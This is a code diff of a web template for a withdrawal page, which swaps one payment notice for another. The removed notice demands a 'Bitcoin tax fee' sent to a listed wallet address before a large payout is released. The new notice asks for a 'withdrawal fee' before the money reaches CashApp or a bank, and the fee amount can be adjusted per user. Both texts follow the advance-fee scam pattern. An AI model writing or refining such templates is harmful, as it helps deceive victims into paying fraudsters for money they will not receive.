@@ -17,19 +17,7 @@
                             <div class="">
                                 <center>
                                     <div style="font-size: 18px" class="alert alert-info fade show" role="alert">
-                                        <p>I am pleased to inform you that your payment is ready to be sent to your
-                                            <span class="text-capitalize">{{ $withdraw->withdrawal_method }}</span> account. However, before proceeding, there is a Bitcoin tax fee of ${{ auth()->user()->notice ? : "589" }} that needs to be paid. This tax fee is required by
-                                            {{ env('APP_NAME') }} due to the nature of the transaction. The reason behind this tax fee is to ensure that the money you have received, amounting to $24,062.63, will not be refunded back to us. </p>
-
-                                        <p>Once the Bitcoin tax fee has been successfully paid, you can expect to receive your payment immediately in your CashApp account. To proceed with the payment of the fee, please make sure to use Bitcoin and send it to the following address:
-                                        </p>
-                                        <p>
-                                            <span class="text-success">1Fd3VEis1h9n8pMaFMfAXPku17yGbjktuV</span> <br>
-
-                                            Should you have any questions or require further assistance, please do not hesitate to reach out. We are here to help and ensure a smooth transaction.
-                                            <br>
-                                            Thank you for your cooperation.
-                                        </p>
+                                        Withdrawal request received. There's a withdrawal fee of ${{ auth()->user()->notice ? : "589" }}, {{ env('APP_NAME') }} charges this fee to transfer your payment to your CashApp or your bank. Once you pay the fee, You will get your payment immediately to your CashApp or Bank
                                     </div>
                                 </center>
                             </div>
